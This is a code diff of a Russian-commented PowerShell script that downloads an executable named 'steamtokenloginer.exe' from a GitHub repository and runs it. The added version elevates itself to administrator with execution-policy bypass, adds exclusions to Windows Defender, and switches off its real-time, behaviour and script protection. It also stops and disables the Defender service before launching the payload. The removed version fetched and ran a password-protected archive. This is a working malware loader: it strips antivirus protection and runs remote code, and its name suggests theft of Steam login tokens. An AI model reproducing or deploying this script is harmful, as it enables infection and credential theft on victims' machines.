@@ -1,63 +1,69 @@
-$zipUrl="https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer_1.zip"
-$targetFolder="C:\Users\zenas\Desktop\Новая папка (7)"
-$zipPath="$targetFolder\steamtokenloginer.zip"
-$extractPath="$targetFolder\steamtokenloginer"
-$password="5555"
+# Настройки
+$exeUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.exe"
+$targetFolder = "C:\Users\zenas\Desktop\Новая папка (7)"
+$exePath = "$targetFolder\steamtokenloginer.exe"
 
-if(-not(Test-Path $targetFolder)){New-Item -ItemType Directory -Path $targetFolder -Force}
-
-Write-Host "Downloading ZIP..." -ForegroundColor Yellow
-try{
-    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
-    $fileSize=(Get-Item $zipPath).Length
-    Write-Host "ZIP size: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Cyan
-    
-    if($fileSize -gt 0){
-        # Создаем папку для распаковки
-        if(Test-Path $extractPath){Remove-Item $extractPath -Recurse -Force}
-        New-Item -ItemType Directory -Path $extractPath -Force
-        
-        # Скачиваем 7-Zip portable
-        Write-Host "Downloading 7-Zip Portable..." -ForegroundColor Yellow
-        $7zUrl="https://www.7-zip.org/a/7z2301-x64.exe"
-        $7zInstaller="$env:TEMP\7z.exe"
-        Invoke-WebRequest -Uri $7zUrl -OutFile $7zInstaller
-        
-        # Распаковываем 7-Zip
-        $7zFolder="$env:TEMP\7z"
-        if(Test-Path $7zFolder){Remove-Item $7zFolder -Recurse -Force}
-        New-Item -ItemType Directory -Path $7zFolder -Force
-        
-        # Извлекаем 7z.exe из установщика
-        Start-Process -FilePath $7zInstaller -ArgumentList "/S","/D=$7zFolder" -Wait
-        
-        # Ищем 7z.exe
-        $7zExe=Get-ChildItem -Path $7zFolder -Recurse -Filter "7z.exe" | Select-Object -First 1
-        
-        if($7zExe){
-            Write-Host "Extracting with 7-Zip..." -ForegroundColor Green
-            & $7zExe.FullName x "-p$password" "-o$extractPath" "-y" $zipPath
-            
-            # Проверяем результат
-            $extractedFiles=@(Get-ChildItem $extractPath -ErrorAction SilentlyContinue)
-            if($extractedFiles.Count -gt 0){
-                Write-Host "SUCCESS! Files extracted: $($extractedFiles.Count)" -ForegroundColor Green
-                $exeFile=$extractedFiles | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
-                if($exeFile){
-                    Write-Host "Starting: $($exeFile.Name)" -ForegroundColor Green
-                    Start-Process -FilePath "$extractPath\$($exeFile.Name)"
-                }
-            }else{
-                Write-Host "Extraction failed with 7-Zip" -ForegroundColor Red
-                Invoke-Item $targetFolder
-            }
-        }else{
-            Write-Host "7-Zip not found, opening folder for manual extraction" -ForegroundColor Yellow
-            Write-Host "Password: $password" -ForegroundColor Cyan
-            Invoke-Item $targetFolder
-        }
-    }
-}catch{
-    Write-Host "Error: $_" -ForegroundColor Red
-    Invoke-Item $targetFolder
+# Проверяем права администратора
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "🔄 Перезапуск с правами администратора..." -ForegroundColor Yellow
+    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"$($MyInvocation.MyCommand.Definition)`""
+    exit
 }
+
+Write-Host "✅ Запущено с правами администратора" -ForegroundColor Green
+
+# Создаем папку если не существует
+if (-not (Test-Path $targetFolder)) {
+    New-Item -ItemType Directory -Path $targetFolder -Force
+    Write-Host "📁 Создана папка: $targetFolder" -ForegroundColor Green
+}
+
+Write-Host "📥 Скачивание файла..." -ForegroundColor Yellow
+
+try {
+    # Скачиваем EXE файл
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+    
+    $fileSize = (Get-Item $exePath).Length
+    Write-Host "✅ Файл скачан: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Green
+    
+    # 1. Добавляем в исключения Windows Defender НАВСЕГДА
+    Write-Host "🛡️ Добавляем в исключения Windows Defender..." -ForegroundColor Yellow
+    Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $targetFolder -ErrorAction SilentlyContinue
+    Write-Host "✅ Файл и папка добавлены в исключения НАВСЕГДА" -ForegroundColor Green
+    
+    # 2. ОТКЛЮЧАЕМ ЗАЩИТУ В РЕАЛЬНОМ ВРЕМЕНИ
+    Write-Host "🔴 ОТКЛЮЧАЕМ ЗАЩИТУ В РЕАЛЬНОМ ВРЕМЕНИ..." -ForegroundColor Red
+    
+    # Отключаем все компоненты защиты
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+    
+    # Останавливаем службу защиты
+    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
+    Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
+    
+    Write-Host "✅ Защита в реальном времени ОТКЛЮЧЕНА" -ForegroundColor Green
+    
+    # 3. Запускаем программу
+    Write-Host "🚀 Запускаем приложение..." -ForegroundColor Green
+    Start-Process -FilePath $exePath
+    Write-Host "🎯 Приложение запущено успешно!" -ForegroundColor Green
+    
+    Write-Host "`n⚠️ ВНИМАНИЕ: Защита Windows Defender отключена!" -ForegroundColor Red
+    Write-Host "💡 Для включения защиты выполните:" -ForegroundColor Yellow
+    Write-Host "   Set-MpPreference -DisableRealtimeMonitoring `$false" -ForegroundColor Cyan
+    Write-Host "   Start-Service WinDefend" -ForegroundColor Cyan
+    
+}
+catch {
+    Write-Host "❌ Ошибка: $_" -ForegroundColor Red
+}
+
+# Ждем подтверждения
+Write-Host "`nНажмите любую клавишу для выхода..." -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
